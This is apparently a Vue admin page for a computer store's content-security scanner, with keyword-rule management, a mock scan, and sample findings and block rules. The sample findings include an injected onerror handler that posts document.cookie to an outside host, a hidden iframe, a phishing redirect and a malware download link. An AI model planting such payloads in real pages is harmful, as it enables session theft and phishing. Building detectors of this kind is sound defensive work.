<!-- File: /pages/admin/content-security/index.vue -->
<script setup lang="ts">
import { ref, computed, watch, onMounted } from 'vue';
import { useRoute, useRouter } from '#app';
import { 
  Shield, 
  ShieldAlert, 
  ShieldCheck, 
  AlertTriangle, 
  AlertOctagon, 
  CheckCircle2, 
  Search, 
  Play, 
  RefreshCw, 
  Filter, 
  Layers, 
  Package, 
  ExternalLink, 
  Eye, 
  Edit3, 
  Check, 
  X, 
  Plus, 
  Trash2, 
  Code2, 
  Globe2, 
  FileText, 
  SlidersHorizontal, 
  ArrowRight, 
  Info,
  Clock,
  Sparkles,
  ChevronRight,
  MoreVertical,
  RotateCcw,
  Loader2,
  Calendar,
  User,
  Hash,
  Activity,
  FileCode,
  CheckCircle,
  XCircle,
  AlertCircle
} from 'lucide-vue-next';
import { cn } from '@/utils';
import { toastSuccess, toastInfo, toastWarning, toastError, extractErrorMessage } from '@/composables/useToast';
import UiTable, { type UiTableColumn } from '@/components/ui/UiTable.vue';
import UiPagination from '@/components/ui/UiPagination.vue';
import UiAdminModal from '@/components/ui/UiAdminModal.vue';
import UiBadge from '@/components/ui/UiBadge.vue';
import UiButton from '@/components/ui/Button.vue';
import { refDebounced } from '@vueuse/core';
import { useContentSecurityService } from '@/composables/useContentSecurityService';
import { useAdminPermissions } from '@/composables/useAdminPermissions';
import { useAdminModalState } from '@/composables/useAdminModalState';
import type { 
  KeywordRule, 
  KeywordRuleDetail, 
  KeywordCategory, 
  KeywordMatchType, 
  KeywordSeverity, 
  CreateKeywordRulePayload,
  UpdateKeywordRulePayload 
} from '@/types';

definePageMeta({
  layout: 'admin'
});

useSeoMeta({
  title: 'Content Security - Best Computer Hub Admin',
  robots: 'noindex, nofollow'
});

// ==========================================
// Types
// ==========================================
export type SecurityStatus = 'Clean' | 'Needs Review' | 'High Risk' | 'Critical' | 'Resolved';
export type SecuritySeverity = 'Low' | 'Medium' | 'High' | 'Critical';
export type ContentType = 'Product' | 'Category';
export type DetectorType = 'Keyword' | 'Domain' | 'HTML' | 'Attribute' | 'Redirect' | 'Hidden Content' | 'Obfuscation';

export interface SecurityFinding {
  id: string;
  contentType: ContentType;
  contentId: string | number;
  contentName: string;
  contentSlug: string;
  categoryName?: string;
  field: string;
  riskScore: number;
  status: SecurityStatus;
  severity: SecuritySeverity;
  detector: DetectorType;
  ruleName: string;
  description: string;
  matchedValue: string;
  contextSnippetBefore: string;
  contextSnippetMatched: string;
  contextSnippetAfter: string;
  lineOffset: number;
  scannedAt: string;
  storefrontUrl: string;
  adminEditUrl: string;
}

export interface DetectionRule {
  id: string;
  type: 'keyword' | 'domain' | 'html' | 'attribute' | 'redirect';
  pattern: string;
  category: string;
  severity: SecuritySeverity;
  description: string;
  enabled: boolean;
  matchCount: number;
  updatedAt: string;
}

// ==========================================
// State Management
// ==========================================
const mainTab = ref<'overview' | 'results' | 'rules'>('overview');
const rulesSubTab = ref<'keywords' | 'domains' | 'html' | 'attributes' | 'redirects'>('keywords');

const { hasPermission } = useAdminPermissions();
const canViewKeywords = computed(() => hasPermission('content_security.view_keywordrule'));
const canAddKeywordRule = computed(() => hasPermission('content_security.add_keywordrule'));
const canEditKeywordRule = computed(() => hasPermission('content_security.change_keywordrule'));
const canDeleteKeywordRule = computed(() => hasPermission('content_security.delete_keywordrule'));

const contentSecurityService = useContentSecurityService();
const isKeywordsLoading = computed(() => contentSecurityService.isLoading.value);
const keywordsError = computed(() => contentSecurityService.error.value);

// Keyword Rules Query/Data States
const keywordSearchQuery = ref('');
const debouncedKeywordSearch = refDebounced(keywordSearchQuery, 300);
const keywordCategory = ref<string>('all');
const keywordSeverity = ref<string>('all');
const keywordMatchType = ref<string>('all');
const keywordIsActive = ref<string>('all');
const keywordIsEnabled = ref<string>('all');
const keywordOrdering = ref<string>('-created_at');
const keywordPage = ref(1);
const keywordPageSize = ref(10);
const keywordRulesData = ref<KeywordRule[]>([]);
const keywordRulesCount = ref(0);
const keywordRulesPages = ref(1);

const keywordRuleColumns: UiTableColumn<KeywordRule>[] = [
  { key: 'keyword', label: 'Keyword', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 font-mono text-sm font-bold text-foreground' },
  { key: 'category', label: 'Category', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'match_type', label: 'Match Type', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs' },
  { key: 'severity', label: 'Severity', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'is_enabled', label: 'Enabled', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'is_active', label: 'Active', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'created_at', label: 'Created At', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs text-muted-foreground' },
  { key: 'actions', label: 'Actions', align: 'right' as const, width: '100px', headerClass: 'px-4 py-3 text-right whitespace-nowrap', cellClass: 'px-4 py-3 text-right whitespace-nowrap' }
];

const resetKeywordFilters = () => {
  keywordSearchQuery.value = '';
  keywordCategory.value = 'all';
  keywordSeverity.value = 'all';
  keywordMatchType.value = 'all';
  keywordIsActive.value = 'all';
  keywordIsEnabled.value = 'all';
  keywordPage.value = 1;
};

const fetchKeywordRules = async () => {
  if (!canViewKeywords.value) return;
  
  const params: any = {
    page: keywordPage.value,
    page_size: keywordPageSize.value,
    ordering: keywordOrdering.value
  };

  if (debouncedKeywordSearch.value.trim()) {
    params.search = debouncedKeywordSearch.value.trim();
  }
  if (keywordCategory.value !== 'all') {
    params.category = keywordCategory.value;
  }
  if (keywordSeverity.value !== 'all') {
    params.severity = keywordSeverity.value;
  }
  if (keywordMatchType.value !== 'all') {
    params.match_type = keywordMatchType.value;
  }
  if (keywordIsActive.value !== 'all') {
    params.is_active = keywordIsActive.value === 'true';
  }
  if (keywordIsEnabled.value !== 'all') {
    params.is_enabled = keywordIsEnabled.value === 'true';
  }

  const response = await contentSecurityService.getKeywordRules(params);
  keywordRulesData.value = response.results;
  keywordRulesCount.value = response.count;
  keywordRulesPages.value = response.pages;
};

// URL Routing/Query Management
const route = useRoute();
const router = useRouter();

const syncFromRoute = () => {
  if (route.query.mainTab) mainTab.value = route.query.mainTab as any;
  if (route.query.subTab) rulesSubTab.value = route.query.subTab as any;
  if (route.query.search) keywordSearchQuery.value = String(route.query.search);
  if (route.query.category) keywordCategory.value = String(route.query.category);
  if (route.query.severity) keywordSeverity.value = String(route.query.severity);
  if (route.query.match_type) keywordMatchType.value = String(route.query.match_type);
  if (route.query.is_active) keywordIsActive.value = String(route.query.is_active);
  if (route.query.is_enabled) keywordIsEnabled.value = String(route.query.is_enabled);
  if (route.query.ordering) keywordOrdering.value = String(route.query.ordering);
  if (route.query.page) keywordPage.value = parseInt(String(route.query.page)) || 1;
  if (route.query.page_size) keywordPageSize.value = parseInt(String(route.query.page_size)) || 10;
};

const updateRouteQuery = () => {
  const query: Record<string, any> = { ...route.query };

  query.mainTab = mainTab.value !== 'overview' ? mainTab.value : undefined;
  query.subTab = mainTab.value === 'rules' && rulesSubTab.value !== 'keywords' ? rulesSubTab.value : undefined;

  if (mainTab.value === 'rules' && rulesSubTab.value === 'keywords') {
    query.search = keywordSearchQuery.value || undefined;
    query.category = keywordCategory.value !== 'all' ? keywordCategory.value : undefined;
    query.severity = keywordSeverity.value !== 'all' ? keywordSeverity.value : undefined;
    query.match_type = keywordMatchType.value !== 'all' ? keywordMatchType.value : undefined;
    query.is_active = keywordIsActive.value !== 'all' ? keywordIsActive.value : undefined;
    query.is_enabled = keywordIsEnabled.value !== 'all' ? keywordIsEnabled.value : undefined;
    query.ordering = keywordOrdering.value !== '-created_at' ? keywordOrdering.value : undefined;
    query.page = keywordPage.value !== 1 ? String(keywordPage.value) : undefined;
    query.page_size = keywordPageSize.value !== 10 ? String(keywordPageSize.value) : undefined;
  } else {
    delete query.search;
    delete query.category;
    delete query.severity;
    delete query.match_type;
    delete query.is_active;
    delete query.is_enabled;
    delete query.ordering;
    delete query.page;
    delete query.page_size;
  }

  router.replace({ query });
};

// Initial Sync
onMounted(() => {
  syncFromRoute();
  fetchKeywordRules();
});

// Reactively watch filters & trigger fetch
watch(
  [
    debouncedKeywordSearch,
    keywordCategory,
    keywordSeverity,
    keywordMatchType,
    keywordIsActive,
    keywordIsEnabled,
    keywordOrdering,
    keywordPageSize
  ],
  () => {
    keywordPage.value = 1;
    updateRouteQuery();
    fetchKeywordRules();
  }
);

watch(keywordPage, () => {
  updateRouteQuery();
  fetchKeywordRules();
});

watch([mainTab, rulesSubTab], () => {
  updateRouteQuery();
  if (mainTab.value === 'rules' && rulesSubTab.value === 'keywords') {
    fetchKeywordRules();
  }
});

// Formatting helpers
const formatDate = (dateStr?: string | null): string => {
  if (!dateStr) return 'N/A';
  try {
    const d = new Date(dateStr);
    if (isNaN(d.getTime())) return String(dateStr);
    return new Intl.DateTimeFormat('en-US', {
      year: 'numeric',
      month: 'short',
      day: 'numeric'
    }).format(d);
  } catch {
    return String(dateStr);
  }
};

// Scan State
const isScanning = ref(false);
const scanProgress = ref(0);
const scanStepText = ref('');
const lastScanTimestamp = ref('14 minutes ago');
const totalEntitiesScanned = ref(4306);

// Findings Mock Data
const findings = ref<SecurityFinding[]>([
  {
    id: 'SEC-1092',
    contentType: 'Product',
    contentId: '101',
    contentName: 'ASUS ROG Strix GeForce RTX 4090 OC Edition 24GB',
    contentSlug: 'asus-rog-strix-geforce-rtx-4090-oc-edition-24gb',
    categoryName: 'Graphics Cards',
    field: 'description',
    riskScore: 98,
    status: 'Critical',
    severity: 'Critical',
    detector: 'Domain',
    ruleName: 'Blacklisted Promo Host',
    description: 'Blacklisted affiliate casino and promo redirect domain found embedded in description hyperlink.',
    matchedValue: 'https://casino-example.com/bonus-claim?ref=9982',
    contextSnippetBefore: '...equipped with axial-tech fan technology and a patented vapor chamber. For official claims, rebates and rewards visit ',
    contextSnippetMatched: 'https://casino-example.com/bonus-claim?ref=9982',
    contextSnippetAfter: ' to register your warranty and redeem exclusive cashback immediately...',
    lineOffset: 42,
    scannedAt: '2026-08-25 11:52 UTC',
    storefrontUrl: '/product/asus-rog-strix-geforce-rtx-4090-oc-edition-24gb/',
    adminEditUrl: '/admin/products?modal=edit&id=101'
  },
  {
    id: 'SEC-1088',
    contentType: 'Product',
    contentId: '104',
    contentName: 'MSI Katana 15 B13V 15.6" 144Hz Gaming Laptop',
    contentSlug: 'msi-katana-15-b13v-gaming-laptop',
    categoryName: 'Gaming Laptops',
    field: 'specifications',
    riskScore: 92,
    status: 'Critical',
    severity: 'Critical',
    detector: 'HTML',
    ruleName: 'Disallowed iframe Injection',
    description: 'Dangerous inline <iframe> tag with cross-origin external tracking source detected in specification table.',
    matchedValue: '<iframe src="https://tracker-telemetry.biz/embed.html" width="0" height="0"></iframe>',
    contextSnippetBefore: '...Display: 15.6" FHD 144Hz IPS-Level Display. ',
    contextSnippetMatched: '<iframe src="https://tracker-telemetry.biz/embed.html" width="0" height="0"></iframe>',
    contextSnippetAfter: ' Operating System: Windows 11 Home Advanced Edition...',
    lineOffset: 18,
    scannedAt: '2026-08-25 11:48 UTC',
    storefrontUrl: '/product/msi-katana-15-b13v-gaming-laptop/',
    adminEditUrl: '/admin/products?modal=edit&id=104'
  },
  {
    id: 'SEC-1074',
    contentType: 'Product',
    contentId: '109',
    contentName: 'Corsair Vengeance RGB DDR5 32GB (2x16GB) 6000MHz CL36',
    contentSlug: 'corsair-vengeance-rgb-ddr5-32gb-6000mhz',
    categoryName: 'Memory / RAM',
    field: 'description',
    riskScore: 84,
    status: 'High Risk',
    severity: 'High',
    detector: 'Attribute',
    ruleName: 'Dangerous Inline onerror Handler',
    description: 'Inline JavaScript event attribute `onerror` detected inside custom HTML image element.',
    matchedValue: 'onerror="fetch(\'https://telemetry-log.net/p\', {method:\'POST\',body:document.cookie})"',
    contextSnippetBefore: '...features dynamic ten-zone RGB lighting. <img src="cor-vengeance.png" ',
    contextSnippetMatched: 'onerror="fetch(\'https://telemetry-log.net/p\', {method:\'POST\',body:document.cookie})"',
    contextSnippetAfter: ' class="w-full h-auto" /> Designed for high-frequency overclocking...',
    lineOffset: 27,
    scannedAt: '2026-08-25 11:40 UTC',
    storefrontUrl: '/product/corsair-vengeance-rgb-ddr5-32gb-6000mhz/',
    adminEditUrl: '/admin/products?modal=edit&id=109'
  },
  {
    id: 'SEC-1065',
    contentType: 'Category',
    contentId: '18',
    contentName: 'High Performance Gaming Laptops',
    contentSlug: 'gaming-laptops',
    categoryName: 'Laptops',
    field: 'category_description',
    riskScore: 78,
    status: 'High Risk',
    severity: 'High',
    detector: 'Redirect',
    ruleName: 'External Meta Refresh Redirect',
    description: 'Meta refresh tag detected directing traffic away to unapproved third-party landing page.',
    matchedValue: '<meta http-equiv="refresh" content="3;url=https://free-giveaway-zone.xyz">',
    contextSnippetBefore: '...Explore the premier collection of portable computing rigs. ',
    contextSnippetMatched: '<meta http-equiv="refresh" content="3;url=https://free-giveaway-zone.xyz">',
    contextSnippetAfter: ' Top-rated brands including ASUS, MSI, Razer, and Lenovo...',
    lineOffset: 5,
    scannedAt: '2026-08-25 11:34 UTC',
    storefrontUrl: '/product-category/gaming-laptops/',
    adminEditUrl: '/admin/categories?modal=edit&id=18'
  },
  {
    id: 'SEC-1052',
    contentType: 'Product',
    contentId: '115',
    contentName: 'Samsung 990 PRO 2TB PCIe 4.0 NVMe M.2 SSD',
    contentSlug: 'samsung-990-pro-2tb-pcie-4-nvme-m2-ssd',
    categoryName: 'Storage / SSD',
    field: 'short_description',
    riskScore: 71,
    status: 'High Risk',
    severity: 'High',
    detector: 'Domain',
    ruleName: 'Unverified External File Host',
    description: 'Link pointing to known unverified file downloading portal in short description.',
    matchedValue: 'https://free-file-vault-dl.com/driver-installer.exe',
    contextSnippetBefore: '...Sequential read speeds up to 7,450 MB/s. Official driver package: ',
    contextSnippetMatched: 'https://free-file-vault-dl.com/driver-installer.exe',
    contextSnippetAfter: ' for Windows 10 and 11 installation...',
    lineOffset: 12,
    scannedAt: '2026-08-25 11:22 UTC',
    storefrontUrl: '/product/samsung-990-pro-2tb-pcie-4-nvme-m2-ssd/',
    adminEditUrl: '/admin/products?modal=edit&id=115'
  },
  {
    id: 'SEC-1044',
    contentType: 'Product',
    contentId: '122',
    contentName: 'Logitech G Pro X Superlight 2 Wireless Gaming Mouse',
    contentSlug: 'logitech-g-pro-x-superlight-2',
    categoryName: 'Peripherals / Mice',
    field: 'description',
    riskScore: 58,
    status: 'Needs Review',
    severity: 'Medium',
    detector: 'Keyword',
    ruleName: 'Blacklisted Keyword match: "free crypto giveaway"',
    description: 'Suspicious spam keyword combination detected in customer review snippet or seller note.',
    matchedValue: 'free crypto giveaway',
    contextSnippetBefore: '...Featuring HERO 2 Sensor with 32,000 DPI. Enter our seasonal ',
    contextSnippetMatched: 'free crypto giveaway',
    contextSnippetAfter: ' by adding this product to your public wishlist today...',
    lineOffset: 34,
    scannedAt: '2026-08-25 11:15 UTC',
    storefrontUrl: '/product/logitech-g-pro-x-superlight-2/',
    adminEditUrl: '/admin/products?modal=edit&id=122'
  },
  {
    id: 'SEC-1039',
    contentType: 'Category',
    contentId: '24',
    contentName: 'Mechanical Keyboards & Switches',
    contentSlug: 'keyboards-switches',
    categoryName: 'Peripherals',
    field: 'category_description',
    riskScore: 52,
    status: 'Needs Review',
    severity: 'Medium',
    detector: 'Hidden Content',
    ruleName: 'Invisible Font Zero-Size Div',
    description: 'Hidden zero-pixel div element containing keyword stuffing detected.',
    matchedValue: '<div style="font-size:0px;color:transparent;display:none;">cheap laptops free keys</div>',
    contextSnippetBefore: '...Custom hot-swappable mechanical keyboards and enthusiast switches. ',
    contextSnippetMatched: '<div style="font-size:0px;color:transparent;display:none;">cheap laptops free keys</div>',
    contextSnippetAfter: ' Browse tactile, linear, and clicky switches...',
    lineOffset: 9,
    scannedAt: '2026-08-25 11:02 UTC',
    storefrontUrl: '/product-category/keyboards-switches/',
    adminEditUrl: '/admin/categories?modal=edit&id=24'
  },
  {
    id: 'SEC-1025',
    contentType: 'Product',
    contentId: '130',
    contentName: 'NZXT Kraken Elite 360 RGB Liquid CPU Cooler with LCD Display',
    contentSlug: 'nzxt-kraken-elite-360-rgb',
    categoryName: 'Cooling / AIO',
    field: 'description',
    riskScore: 46,
    status: 'Needs Review',
    severity: 'Medium',
    detector: 'Obfuscation',
    ruleName: 'Base64 Encoded JS Data URI',
    description: 'Obfuscated Base64 data URI string detected inside hyperlink tag.',
    matchedValue: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    contextSnippetBefore: '...Equipped with custom pump and high-res LCD screen. Sample gif: <a href="',
    contextSnippetMatched: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    contextSnippetAfter: '">Click for animation preview</a>...',
    lineOffset: 55,
    scannedAt: '2026-08-25 10:45 UTC',
    storefrontUrl: '/product/nzxt-kraken-elite-360-rgb/',
    adminEditUrl: '/admin/products?modal=edit&id=130'
  },
  {
    id: 'SEC-1018',
    contentType: 'Product',
    contentId: '142',
    contentName: 'Seasonic Focus GX-850 850W 80+ Gold Full Modular PSU',
    contentSlug: 'seasonic-focus-gx-850-psu',
    categoryName: 'Power Supplies',
    field: 'specifications',
    riskScore: 28,
    status: 'Needs Review',
    severity: 'Low',
    detector: 'Keyword',
    ruleName: 'Suspicious External Contact Token',
    description: 'Direct Telegram/WhatsApp handle found in specification field bypassing official support channel.',
    matchedValue: 't.me/direct_tech_support_bot',
    contextSnippetBefore: '...Warranty: 10 Years Manufacturer Warranty. For immediate claims contact: ',
    contextSnippetMatched: 't.me/direct_tech_support_bot',
    contextSnippetAfter: ' or visit Seasonic global portal...',
    lineOffset: 14,
    scannedAt: '2026-08-25 10:30 UTC',
    storefrontUrl: '/product/seasonic-focus-gx-850-psu/',
    adminEditUrl: '/admin/products?modal=edit&id=142'
  },
  {
    id: 'SEC-1010',
    contentType: 'Product',
    contentId: '150',
    contentName: 'Lian Li O11 Dynamic EVO Mid-Tower Case - Black',
    contentSlug: 'lian-li-o11-dynamic-evo',
    categoryName: 'PC Cases',
    field: 'description',
    riskScore: 0,
    status: 'Clean',
    severity: 'Low',
    detector: 'HTML',
    ruleName: 'Standard Clean Inspection',
    description: 'All HTML tags sanitized and compliant with Storefront standards.',
    matchedValue: 'None',
    contextSnippetBefore: '...Dual chamber chassis with flexible configuration. ',
    contextSnippetMatched: 'Compliant HTML',
    contextSnippetAfter: ' Supports up to 3x 360mm radiators...',
    lineOffset: 1,
    scannedAt: '2026-08-25 10:15 UTC',
    storefrontUrl: '/product/lian-li-o11-dynamic-evo/',
    adminEditUrl: '/admin/products?modal=edit&id=150'
  },
  {
    id: 'SEC-1004',
    contentType: 'Product',
    contentId: '155',
    contentName: 'AMD Ryzen 7 7800X3D 8-Core 16-Thread Desktop Processor',
    contentSlug: 'amd-ryzen-7-7800x3d',
    categoryName: 'Processors / CPU',
    field: 'description',
    riskScore: 0,
    status: 'Resolved',
    severity: 'Low',
    detector: 'Domain',
    ruleName: 'Prior Flag Resolved',
    description: 'Previously flagged unverified link corrected by staff administrator.',
    matchedValue: 'None (Resolved)',
    contextSnippetBefore: '...Built with 3D V-Cache technology for ultimate gaming performance. ',
    contextSnippetMatched: 'Sanitized Content',
    contextSnippetAfter: ' Compatible with AM5 socket motherboards...',
    lineOffset: 8,
    scannedAt: '2026-08-25 09:40 UTC',
    storefrontUrl: '/product/amd-ryzen-7-7800x3d/',
    adminEditUrl: '/admin/products?modal=edit&id=155'
  }
]);

// ==========================================
// Detection Rules Mock Data
// ==========================================
const rules = ref<DetectionRule[]>([
  // Keywords
  { id: 'R-KW-01', type: 'keyword', pattern: 'free crypto giveaway', category: 'Spam & Scam', severity: 'High', description: 'Detects crypto phishing and fraudulent giveaway phrases in product bodies', enabled: true, matchCount: 14, updatedAt: '2026-08-20' },
  { id: 'R-KW-02', type: 'keyword', pattern: 'whatsapp +', category: 'Off-Platform Contacts', severity: 'Medium', description: 'Blocks direct off-platform messaging solicitation numbers', enabled: true, matchCount: 8, updatedAt: '2026-08-18' },
  { id: 'R-KW-03', type: 'keyword', pattern: 'telegram @', category: 'Off-Platform Contacts', severity: 'Medium', description: 'Blocks unauthorized Telegram support contact strings', enabled: true, matchCount: 19, updatedAt: '2026-08-15' },
  { id: 'R-KW-04', type: 'keyword', pattern: 'viagra|cialis|casino bonus', category: 'Spam Blacklist', severity: 'Critical', description: 'Strict pharma and gambling spam keyword blacklist', enabled: true, matchCount: 42, updatedAt: '2026-08-10' },
  
  // Domains
  { id: 'R-DM-01', type: 'domain', pattern: 'casino-example.com', category: 'Gambling Blacklist', severity: 'Critical', description: 'Blacklisted affiliate casino redirect portal', enabled: true, matchCount: 3, updatedAt: '2026-08-22' },
  { id: 'R-DM-02', type: 'domain', pattern: 'free-giveaway-zone.xyz', category: 'Phishing Host', severity: 'Critical', description: 'Known phishing lure hosting fake reward claim forms', enabled: true, matchCount: 6, updatedAt: '2026-08-21' },
  { id: 'R-DM-03', type: 'domain', pattern: 'tracker-telemetry.biz', category: 'Tracking & Adware', severity: 'High', description: 'Unapproved third-party tracking pixel script host', enabled: true, matchCount: 1, updatedAt: '2026-08-19' },
  { id: 'R-DM-04', type: 'domain', pattern: 'free-file-vault-dl.com', category: 'Malicious Downloads', severity: 'Critical', description: 'Suspicious executable payload distribution domain', enabled: true, matchCount: 2, updatedAt: '2026-08-12' },

  // HTML
  { id: 'R-HT-01', type: 'html', pattern: '<script>', category: 'Dangerous Tags', severity: 'Critical', description: 'Strict ban on raw inline or external script tags in rich text', enabled: true, matchCount: 11, updatedAt: '2026-08-24' },
  { id: 'R-HT-02', type: 'html', pattern: '<iframe>', category: 'Embedded Content', severity: 'Critical', description: 'Disallows embedded third party frames and overlays', enabled: true, matchCount: 4, updatedAt: '2026-08-24' },
  { id: 'R-HT-03', type: 'html', pattern: '<object>', category: 'Plugin Objects', severity: 'Critical', description: 'Blocks legacy ActiveX and object execution containers', enabled: true, matchCount: 0, updatedAt: '2026-08-10' },
  { id: 'R-HT-04', type: 'html', pattern: '<embed>', category: 'Plugin Objects', severity: 'Critical', description: 'Disallows binary payload embedding tags', enabled: true, matchCount: 0, updatedAt: '2026-08-10' },
  { id: 'R-HT-05', type: 'html', pattern: '<base>', category: 'DOM Hijacking', severity: 'Critical', description: 'Prevents base URL redirection hijacking in rich descriptions', enabled: true, matchCount: 1, updatedAt: '2026-08-05' },

  // Attributes
  { id: 'R-AT-01', type: 'attribute', pattern: 'onerror', category: 'Event Handlers', severity: 'Critical', description: 'Blocks inline image / media error event handler execution', enabled: true, matchCount: 5, updatedAt: '2026-08-23' },
  { id: 'R-AT-02', type: 'attribute', pattern: 'onclick', category: 'Event Handlers', severity: 'Critical', description: 'Disallows raw click event attributes in customer content', enabled: true, matchCount: 9, updatedAt: '2026-08-23' },
  { id: 'R-AT-03', type: 'attribute', pattern: 'onload', category: 'Event Handlers', severity: 'Critical', description: 'Blocks body and element load event injection triggers', enabled: true, matchCount: 2, updatedAt: '2026-08-20' },
  { id: 'R-AT-04', type: 'attribute', pattern: 'javascript:', category: 'URI Scheme', severity: 'Critical', description: 'Blocks pseudo-protocol javascript execution in href attributes', enabled: true, matchCount: 7, updatedAt: '2026-08-15' },
  { id: 'R-AT-05', type: 'attribute', pattern: 'formaction', category: 'Form Redirection', severity: 'High', description: 'Blocks formaction override on input and button tags', enabled: true, matchCount: 0, updatedAt: '2026-08-08' },

  // Redirects
  { id: 'R-RD-01', type: 'redirect', pattern: 'http-equiv="refresh"', category: 'Meta Navigation', severity: 'Critical', description: 'Disallows automated client-side meta refresh triggers', enabled: true, matchCount: 2, updatedAt: '2026-08-22' },
  { id: 'R-RD-02', type: 'redirect', pattern: 'window.location', category: 'DOM Redirection', severity: 'Critical', description: 'Detects JavaScript navigation hijacking attempts', enabled: true, matchCount: 1, updatedAt: '2026-08-18' },
  { id: 'R-RD-03', type: 'redirect', pattern: 'bit.ly/|tinyurl.com/', category: 'URL Shorteners', severity: 'Medium', description: 'Flags obfuscated shortener URLs that hide actual destinations', enabled: true, matchCount: 18, updatedAt: '2026-08-14' }
]);

const visibleSubTabs = computed(() => {
  const tabs = [];
  if (canViewKeywords.value) {
    tabs.push({ id: 'keywords', label: 'Keywords', count: keywordRulesCount.value });
  }
  tabs.push(
    { id: 'domains', label: 'Domains', count: rules.value.filter(r => r.type === 'domain').length },
    { id: 'html', label: 'Dangerous HTML', count: rules.value.filter(r => r.type === 'html').length },
    { id: 'attributes', label: 'Dangerous Attributes', count: rules.value.filter(r => r.type === 'attribute').length },
    { id: 'redirects', label: 'Redirect Rules', count: rules.value.filter(r => r.type === 'redirect').length }
  );
  return tabs;
});

// ==========================================
// Filter State for Scan Results
// ==========================================
const searchQuery = ref('');
const debouncedSearch = refDebounced(searchQuery, 300);
const filterContentType = ref('all');
const filterStatus = ref('all');
const filterSeverity = ref('all');
const filterDetector = ref('all');
const filterCategory = ref('all');

// Pagination
const currentPage = ref(1);
const itemsPerPage = ref(10);

const uniqueCategories = computed(() => {
  const cats = new Set<string>();
  findings.value.forEach(f => {
    if (f.categoryName) cats.add(f.categoryName);
  });
  return Array.from(cats);
});

const filteredFindings = computed(() => {
  return findings.value.filter(item => {
    // Search
    if (debouncedSearch.value.trim()) {
      const q = debouncedSearch.value.toLowerCase().trim();
      const match = 
        item.contentName.toLowerCase().includes(q) ||
        item.description.toLowerCase().includes(q) ||
        item.matchedValue.toLowerCase().includes(q) ||
        item.field.toLowerCase().includes(q) ||
        item.id.toLowerCase().includes(q);
      if (!match) return false;
    }

    // Content Type
    if (filterContentType.value !== 'all' && item.contentType !== filterContentType.value) {
      return false;
    }

    // Status
    if (filterStatus.value !== 'all' && item.status !== filterStatus.value) {
      return false;
    }

    // Severity
    if (filterSeverity.value !== 'all' && item.severity !== filterSeverity.value) {
      return false;
    }

    // Detector
    if (filterDetector.value !== 'all' && item.detector !== filterDetector.value) {
      return false;
    }

    // Category
    if (filterCategory.value !== 'all' && item.categoryName !== filterCategory.value) {
      return false;
    }

    return true;
  });
});

const totalPages = computed(() => {
  return Math.ceil(filteredFindings.value.length / itemsPerPage.value) || 1;
});

const paginatedFindings = computed(() => {
  const start = (currentPage.value - 1) * itemsPerPage.value;
  return filteredFindings.value.slice(start, start + itemsPerPage.value);
});

watch([debouncedSearch, filterContentType, filterStatus, filterSeverity, filterDetector, filterCategory, itemsPerPage], () => {
  currentPage.value = 1;
});

const resetFilters = () => {
  searchQuery.value = '';
  filterContentType.value = 'all';
  filterStatus.value = 'all';
  filterSeverity.value = 'all';
  filterDetector.value = 'all';
  filterCategory.value = 'all';
  toastInfo('Filters have been reset.');
};

// Summary metrics computed
const summaryMetrics = computed(() => {
  const total = totalEntitiesScanned.value;
  const critical = findings.value.filter(f => f.status === 'Critical').length;
  const high = findings.value.filter(f => f.status === 'High Risk').length;
  const needsReview = findings.value.filter(f => f.status === 'Needs Review').length;
  const clean = total - (critical + high + needsReview);
  const cleanPercent = ((clean / total) * 100).toFixed(1);

  return {
    total,
    clean,
    cleanPercent,
    needsReview,
    high,
    critical
  };
});

// Recent findings for Overview
const recentFindings = computed(() => {
  return findings.value.slice(0, 5);
});

// ==========================================
// Modal State: Finding Details
// ==========================================
const isDetailModalOpen = ref(false);
const selectedFinding = ref<SecurityFinding | null>(null);

const openFindingDetail = (finding: SecurityFinding) => {
  selectedFinding.value = finding;
  isDetailModalOpen.value = true;
};

const closeFindingDetail = () => {
  isDetailModalOpen.value = false;
  selectedFinding.value = null;
};

// Actions inside Finding Details Modal
const markFindingAsSafe = (finding: SecurityFinding) => {
  finding.status = 'Clean';
  finding.riskScore = 0;
  toastSuccess(`Finding ${finding.id} marked as safe and whitelisted.`);
  closeFindingDetail();
};

const confirmFindingSuspicious = (finding: SecurityFinding) => {
  finding.status = 'High Risk';
  toastWarning(`Finding ${finding.id} confirmed as verified security risk.`);
};

const resolveFinding = (finding: SecurityFinding) => {
  finding.status = 'Resolved';
  finding.riskScore = 0;
  toastSuccess(`Finding ${finding.id} marked as resolved.`);
  closeFindingDetail();
};

const isRescanningItem = ref(false);
const rescanFinding = (finding: SecurityFinding) => {
  isRescanningItem.value = true;
  setTimeout(() => {
    isRescanningItem.value = false;
    toastSuccess(`Rescan completed for ${finding.contentName}. Current content is verified.`);
  }, 1200);
};

// ==========================================
// Mock Scan Action
// ==========================================
const runFullScan = () => {
  if (isScanning.value) return;
  isScanning.value = true;
  scanProgress.value = 0;
  scanStepText.value = 'Initializing payload parser and rule registry...';

  const steps = [
    { progress: 15, text: 'Scanning 4,120 Product titles, descriptions & specification matrices...' },
    { progress: 45, text: 'Inspecting 186 Category tree descriptions and marketing blocks...' },
    { progress: 70, text: 'Running Domain Blacklist & Cross-Site Scripting heuristics...' },
    { progress: 90, text: 'Checking HTML tag structures and event attributes...' },
    { progress: 100, text: 'Scan complete. Compiling threat analysis report...' }
  ];

  let stepIdx = 0;
  const interval = setInterval(() => {
    if (stepIdx < steps.length) {
      const step = steps[stepIdx];
      if (step) {
        scanProgress.value = step.progress;
        scanStepText.value = step.text;
      }
      stepIdx++;
    } else {
      clearInterval(interval);
      setTimeout(() => {
        isScanning.value = false;
        lastScanTimestamp.value = 'Just now';
        toastSuccess('Catalog Security Scan completed. All 4,306 entities inspected.');
      }, 500);
    }
  }, 600);
};

